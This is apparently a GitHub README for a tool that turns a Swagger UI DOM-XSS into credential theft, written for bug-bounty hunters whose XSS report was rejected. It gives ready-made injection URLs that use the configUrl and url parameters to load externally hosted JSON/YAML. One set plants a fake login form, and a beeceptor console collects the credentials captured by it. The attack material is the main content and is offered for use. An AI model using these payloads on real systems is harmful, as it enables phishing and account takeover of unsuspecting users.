# Steal Users Credentials via Swagger UI DOM-XSS

Find xss at swagger ui and the triager didn't accept it as there is no cookie?

Use this repo to make fake login form and get user's Credentials 

Read this article first https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/ 
and practice with https://medium.com/@AlQa3Qa3_M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96

## Demo

If you found Swagger UI try test xss 

        inject this at https://api.redirect.com/swagger/index.html?configUrl=https://m0x0101.github.io/lol/test.json
        or 
        https://api.redirect.com/swagger/index.html?url=https://m0x0101.github.io/lol/test.yaml

For Steal Users Credentials with form 
    
    1.  inject this at https://api.redirect.com/swagger/index.html?configUrl=https://m0x0101.github.io/lol/credentials_form.json
        or 
        https://api.redirect.com/swagger/index.html?url=https://m0x0101.github.io/lol/credentials_form.yaml
    2.  visit https://app.beeceptor.com/console/alqa3qa3m0x0101

## Feedback

If you have any feedback, please reach out to us at m0x0101.ctf@gmail.com



## Authors

- [@Mohamed Reda](https://www.github.com/M0x0101)


## Resources

https://medium.com/@AlQa3Qa3_M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96

https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
## 🔗 Links
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/alqa3qa3m0x0101//)
[![twitter](https://img.shields.io/badge/twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/AlQa3Qa3M0x0101/)


<a href="https://www.buymeacoffee.com/M0X0101" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>


## Tech Stack

**Client:** HTML, JS


